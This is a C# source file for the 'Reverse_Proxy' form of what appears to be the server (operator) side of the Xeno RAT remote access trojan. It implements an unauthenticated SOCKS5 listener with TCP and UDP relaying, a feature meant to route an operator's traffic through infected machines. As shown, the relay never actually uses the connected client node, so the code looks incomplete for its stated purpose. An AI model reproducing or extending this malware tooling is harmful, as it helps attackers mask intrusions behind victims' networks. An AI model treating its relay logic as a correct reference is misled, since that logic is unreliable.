using dnlib.DotNet.Emit;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class Reverse_Proxy : Form
    {
        Node client;
        private Socket listenerSocket;
        private CancellationTokenSource _acceptCts;
        private Task _acceptLoopTask;
        private List<Node> activeSubnodes = new List<Node>();
        private X509Certificate2 serverCertificate;

        public Reverse_Proxy(Node _client, X509Certificate2 certificate = null)
        {
            InitializeComponent();
            client = _client;
            client.AddTempOnDisconnect(OnClientDisconnect);
            serverCertificate = certificate; // optional, required for TLS
        }

        private void OnClientDisconnect(Node node)
        {
            foreach (var n in activeSubnodes) n?.Disconnect();
            activeSubnodes.Clear();
            listenerSocket?.Close();
        }

        private async Task AcceptLoop(int port, CancellationToken token)
        {
            listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            listenerSocket.Bind(new IPEndPoint(IPAddress.Any, port));
            listenerSocket.Listen(100);

            while (!token.IsCancellationRequested)
            {
                try
                {
                    var clientSock = await listenerSocket.AcceptAsync();
                    _ = Task.Run(() => HandleClientSock(clientSock, token));
                }
                catch (ObjectDisposedException)
                {
                    // Expected when stopping the listener
                    break;
                }
                catch (SocketException)
                {
                    // Likely listener closed
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("AcceptLoop error: " + ex.Message);
                }
            }
        }


        private async Task HandleClientSock(Socket clientSock, CancellationToken token)
        {
            try
            {
                // Start SOCKS5 negotiation
                if (!await StartNegotiation(clientSock)) return;

                // Handle CONNECT command
                await HandleConnect(clientSock);
            }
            catch { clientSock.Close(); }
        }

        private async Task HandleConnect(Socket clientSock)
        {
            try
            {
                // Receive first 4 bytes: VER, CMD, RSV, ATYP
                byte[] header = await RecvAll(clientSock, 4);
                if (header == null || header.Length < 4)
                {
                    clientSock.Close();
                    return;
                }

                byte ver = header[0];
                byte cmd = header[1];
                byte rsv = header[2];
                byte addrType = header[3];

                if (ver != 5)
                {
                    await SendSocksReply(clientSock, 1); // General SOCKS failure
                    clientSock.Close();
                    return;
                }

                // --- Handle unsupported commands early ---
                if (cmd != 1 && cmd != 3) // 1=CONNECT, 3=UDP ASSOCIATE
                {
                    await SendSocksReply(clientSock, 7); // Command not supported
                    clientSock.Close();
                    return;
                }

                string destAddr = "";
                if (addrType == 1) // IPv4
                {
                    byte[] ipBytes = await RecvAll(clientSock, 4);
                    if (ipBytes == null) { clientSock.Close(); return; }
                    destAddr = string.Join(".", ipBytes);
                }
                else if (addrType == 3) // Domain name
                {
                    byte[] lenBuf = await RecvAll(clientSock, 1);
                    if (lenBuf == null) { clientSock.Close(); return; }
                    int len = lenBuf[0];

                    byte[] domainBytes = await RecvAll(clientSock, len);
                    if (domainBytes == null) { clientSock.Close(); return; }
                    destAddr = Encoding.ASCII.GetString(domainBytes);
                }
                else if (addrType == 4) // IPv6
                {
                    byte[] ipBytes = await RecvAll(clientSock, 16);
                    if (ipBytes == null) { clientSock.Close(); return; }
                    destAddr = new IPAddress(ipBytes).ToString();
                }
                else
                {
                    await SendSocksReply(clientSock, 8); // Address type not supported
                    clientSock.Close();
                    return;
                }

                // Read destination port (2 bytes)
                byte[] portBytes = await RecvAll(clientSock, 2);
                if (portBytes == null) { clientSock.Close(); return; }
                int destPort = (portBytes[0] << 8) | portBytes[1];

                ListViewItem lvi = null;

                // --- Handle UDP relay (CMD = 3) ---
                if (cmd == 3)
                {
                    UdpClient udpRelay = new UdpClient(0);
                    IPEndPoint localEp = (IPEndPoint)udpRelay.Client.LocalEndPoint;
                    await SendSocksReply(clientSock, 0, localEp.Address, (ushort)localEp.Port);

                    lvi = new ListViewItem($"UDP Relay {localEp.Address}:{localEp.Port}");
                    listView1?.BeginInvoke((MethodInvoker)(() => listView1.Items.Add(lvi)));

                    _ = Task.Run(() => HandleUdpRelay(udpRelay, clientSock, lvi));
                    return;
                }
                else if (cmd == 1)
                {
                    // TCP relay            
                    // Connect to the remote destination
                    TcpClient remoteClient = new TcpClient();
                    try
                    {
                        await remoteClient.ConnectAsync(destAddr, destPort);
                    }
                    catch
                    {
                        await SendSocksReply(clientSock, 5);
                        clientSock.Close();
                        return;
                    }

                    await SendSocksReply(clientSock, 0);

                    lvi = new ListViewItem($"{destAddr}:{destPort}");
                    listView1?.BeginInvoke((MethodInvoker)(() => {
                        listView1.Items.Add(lvi);
                        listView1.AutoResizeColumn(0, ColumnHeaderAutoResizeStyle.ColumnContent);
                        if (listView1.Items.Count > 0)
                        {
                            listView1.EnsureVisible(listView1.Items.Count - 1);
                        }
                    }));

                    _ = Task.Run(() => RelayLoop(clientSock, remoteClient, lvi));
                }
            }
            catch
            {
                clientSock.Close();
            }
        }

        private async Task HandleUdpRelay(UdpClient udpRelay, Socket clientSock, ListViewItem lvi)
        {
            try
            {
                Console.WriteLine("UDP relay started...");

                while (true)
                {
                    var result = await udpRelay.ReceiveAsync();
                    byte[] data = result.Buffer;
                    IPEndPoint sourceEp = result.RemoteEndPoint;

                    if (data.Length < 10) // Minimum SOCKS5 UDP header size
                        continue;

                    int offset = 0;

                    // SOCKS5 UDP Header: RSV (2) + FRAG (1)
                    offset += 2; // RSV
                    offset += 1; // FRAG

                    byte atyp = data[offset++];
                    string destAddr = "";
                    int destPort = 0;

                    // --- Parse ATYP and destination address ---
                    switch (atyp)
                    {
                        case 0x01: // IPv4
                            destAddr = new IPAddress(data.Skip(offset).Take(4).ToArray()).ToString();
                            offset += 4;
                            break;

                        case 0x03: // Domain name
                            int len = data[offset++];
                            destAddr = Encoding.ASCII.GetString(data, offset, len);
                            offset += len;
                            break;

                        case 0x04: // IPv6
                            destAddr = new IPAddress(data.Skip(offset).Take(16).ToArray()).ToString();
                            offset += 16;
                            break;

                        default:
                            Console.WriteLine($"Unsupported ATYP: {atyp}");
                            continue;
                    }

                    // --- Parse destination port ---
                    destPort = (data[offset] << 8) | data[offset + 1];
                    offset += 2;

                    // --- Extract UDP payload ---
                    byte[] payload = data.Skip(offset).ToArray();

                    Console.WriteLine($"Parsed SOCKS5 UDP: {destAddr}:{destPort} | {payload.Length} bytes");

                    // --- Send payload to the destination ---
                    using (UdpClient remoteUdp = new UdpClient())
                    {
                        await remoteUdp.SendAsync(payload, payload.Length, destAddr, destPort);

                        // Wait for response
                        var response = await remoteUdp.ReceiveAsync();

                        // Build SOCKS5 UDP response header + payload
                        byte[] framed = BuildUdpResponse(response.Buffer, response.RemoteEndPoint);

                        // Send back through proxy relay
                        await udpRelay.SendAsync(framed, framed.Length, sourceEp);
                        Console.WriteLine($"Relayed {response.Buffer.Length} bytes from {response.RemoteEndPoint} back to client");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("UDP Relay Exception: " + ex.Message);
                udpRelay.Close();
            }
            finally
            {
                listView1?.BeginInvoke((MethodInvoker)(() => lvi.Remove()));
            }
        }

        private byte[] BuildUdpResponse(byte[] payload, IPEndPoint remote)
        {
            byte[] addrBytes = remote.Address.GetAddressBytes();
            byte[] portBytes = { (byte)(remote.Port >> 8), (byte)(remote.Port & 0xFF) };

            byte atyp = addrBytes.Length == 4 ? (byte)0x01 : (byte)0x04;

            byte[] header = new byte[3 + 1 + addrBytes.Length + 2];
            int offset = 0;

            header[offset++] = 0x00; // RSV
            header[offset++] = 0x00; // RSV
            header[offset++] = 0x00; // FRAG
            header[offset++] = atyp;

            Array.Copy(addrBytes, 0, header, offset, addrBytes.Length);
            offset += addrBytes.Length;

            Array.Copy(portBytes, 0, header, offset, 2);
            offset += 2;

            return header.Concat(payload).ToArray();
        }


        private async Task<bool> StartNegotiation(Socket clientSock)
        {
            byte[] version = await RecvAll(clientSock, 1);
            if (version == null || version[0] != 5) return false;

            byte[] nMethods = await RecvAll(clientSock, 1);
            if (nMethods == null) return false;

            byte[] methods = await RecvAll(clientSock, nMethods[0]);
            if (methods == null) return false;

            // Only no-auth
            await clientSock.SendAsync(new ArraySegment<byte>(new byte[] { 5, 0 }), SocketFlags.None);
            return true;
        }

        private async Task RelayLoop(Socket clientSock, TcpClient remoteClient, ListViewItem lvi)
        {
            var clientStream = new NetworkStream(clientSock, true);
            var remoteStream = remoteClient.GetStream();

            var buffer = new byte[4096];

            try
            {
                while (clientSock.Connected && remoteClient.Connected)
                {
                    // Read from client
                    if (clientSock.Available > 0)
                    {
                        int read = await clientStream.ReadAsync(buffer, 0, buffer.Length);
                        if (read == 0) break;
                        await remoteStream.WriteAsync(buffer, 0, read);
                    }

                    // Read from remote
                    if (remoteClient.Available > 0)
                    {
                        int read = await remoteStream.ReadAsync(buffer, 0, buffer.Length);
                        if (read == 0) break;
                        await clientStream.WriteAsync(buffer, 0, read);
                    }

                    await Task.Delay(10);
                }
            }
            catch { }
            finally
            {
                clientSock.Close();
                remoteClient.Close();

                // Remove the ListView item safely
                if (lvi != null)
                    listView1?.BeginInvoke((MethodInvoker)(() => lvi.Remove()));
            }
        }

        private async Task SendSocksReply(Socket sock, byte replyCode, IPAddress bindAddr = null, ushort bindPort = 0)
        {
            if (bindAddr == null) bindAddr = IPAddress.Any;
            byte[] addrBytes = bindAddr.GetAddressBytes();
            byte[] portBytes = new byte[2] { (byte)(bindPort >> 8), (byte)(bindPort & 0xFF) };
            byte[] reply = new byte[10] { 5, replyCode, 0, 1, addrBytes[0], addrBytes[1], addrBytes[2], addrBytes[3], portBytes[0], portBytes[1] };
            await sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None);
        }

        private async Task<byte[]> RecvAll(Socket sock, int size)
        {
            byte[] data = new byte[size];
            int received = 0;
            while (received < size)
            {
                int r = await sock.ReceiveAsync(new ArraySegment<byte>(data, received, size - received), SocketFlags.None);
                if (r == 0) return null;
                received += r;
            }
            return data;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            int port = int.Parse(textBox1.Text);
            _acceptCts = new CancellationTokenSource();
            _acceptLoopTask = AcceptLoop(port, _acceptCts.Token);
            button1.Enabled = false;
            button2.Enabled = true;
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            _acceptCts?.Cancel();
            listenerSocket?.Close();
            if (_acceptLoopTask != null) await Task.WhenAny(_acceptLoopTask, Task.Delay(500));
            button1.Enabled = true;
            button2.Enabled = false;
        }

        private void Reverse_Proxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            _acceptCts?.Cancel();
            listenerSocket?.Close();
        }

        private void textBox2_TextChanged(object sender, EventArgs e) { }

        private void Reverse_Proxy_Load(object sender, EventArgs e)
        {
            listView1.GetType().GetProperty("DoubleBuffered", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic).SetValue(listView1, true, null);
        }
    }
}